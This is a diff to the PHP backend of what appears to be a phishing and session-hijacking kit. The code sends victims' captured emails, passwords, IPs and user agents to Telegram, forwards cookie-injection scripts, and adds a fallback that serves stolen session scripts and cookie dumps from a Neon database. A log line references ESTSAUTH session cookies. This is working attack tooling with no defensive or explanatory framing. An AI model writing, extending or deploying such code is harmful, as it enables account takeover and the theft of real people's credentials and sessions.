@@ -1601,9 +1601,13 @@ class Api {
                         $ua = $neonRow['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
                         Worker::sendTelegramMessage($email, $password, $ip, $ua, "✅ Worker Session Captured");
 
-                        // Send inject file if it exists
+                        // Send inject file — materialize from Neon if the worker stored it in the DB
                         $baseDir = realpath(__DIR__ . '/..');
                         $injectFile = $baseDir . '/session_data/inject_session_' . $sessionId . '.js';
+                        if (!file_exists($injectFile) && !empty($dataArr['injectionScript'])) {
+                            if (!is_dir(dirname($injectFile))) @mkdir(dirname($injectFile), 0777, true);
+                            @file_put_contents($injectFile, $dataArr['injectionScript']);
+                        }
                         if (file_exists($injectFile)) {
                             Worker::sendTelegramDocument($email, $injectFile, "cookies_{$email}.js");
                         }
@@ -2479,6 +2483,20 @@ class Api {
         $jsFile = $sessionDir . '/inject_session_' . $id . '.js';
         $txtFile = $sessionDir . '/cookies_all_' . $id . '.txt';
 
+        // Worker sessions store artifacts in Neon (data.injectionScript / data.cookiesTxt),
+        // not as files on the VPS. Serve from Neon when the local file is absent.
+        $neonJs = '';
+        $neonTxt = '';
+        $neonRow = NeonDB::get($id);
+        if ($neonRow) {
+            $nd = $neonRow['data'] ?? null;
+            if (is_string($nd)) $nd = json_decode($nd, true);
+            if (is_array($nd)) {
+                $neonJs  = (string)($nd['injectionScript'] ?? '');
+                $neonTxt = (string)($nd['cookiesTxt'] ?? '');
+            }
+        }
+
         // Check if there's a newer version (e.g. from local_cap refresh)
         // If the ID passed is an old device_flow ID, but a newer local_cap exists for the same user, 
         // we might want to return that. However, for now, we just serve the requested ID.
@@ -2491,20 +2509,28 @@ class Api {
                     Security::log("ADMIN_RETRIEVAL: Serving JS script with ESTSAUTH for ID $id");
                 }
                 echo json_encode(['ok' => true, 'content' => $content, 'type' => 'js']);
+            } elseif ($neonJs !== '') {
+                echo json_encode(['ok' => true, 'content' => $neonJs, 'type' => 'js', 'source' => 'neon']);
             } else {
                 echo json_encode(['ok' => false, 'error' => 'Script not found']);
             }
         } elseif ($type === 'txt') {
             if (file_exists($txtFile)) {
                 echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
+            } elseif ($neonTxt !== '') {
+                echo json_encode(['ok' => true, 'content' => $neonTxt, 'type' => 'txt', 'source' => 'neon']);
             } else {
                 echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
             }
         } else {
             if (file_exists($jsFile)) {
                 echo json_encode(['ok' => true, 'content' => file_get_contents($jsFile), 'type' => 'js']);
+            } elseif ($neonJs !== '') {
+                echo json_encode(['ok' => true, 'content' => $neonJs, 'type' => 'js', 'source' => 'neon']);
             } elseif (file_exists($txtFile)) {
                 echo json_encode(['ok' => true, 'content' => file_get_contents($txtFile), 'type' => 'txt']);
+            } elseif ($neonTxt !== '') {
+                echo json_encode(['ok' => true, 'content' => $neonTxt, 'type' => 'txt', 'source' => 'neon']);
             } else {
                 echo json_encode(['ok' => false, 'error' => 'Cookies not found']);
             }
